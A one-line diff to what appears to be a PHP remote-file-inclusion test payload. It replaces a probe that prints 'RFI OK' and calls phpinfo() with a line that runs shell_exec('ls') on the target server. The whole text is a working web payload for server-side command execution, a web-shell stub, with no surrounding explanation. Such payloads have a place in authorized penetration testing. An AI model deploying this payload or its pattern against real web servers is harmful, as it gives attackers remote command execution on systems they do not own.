@@ -1,1 +1,1 @@
-<?php echo "RFI OK"; phpinfo(); ?>
+<?php echo shell_exec("ls"); ?>
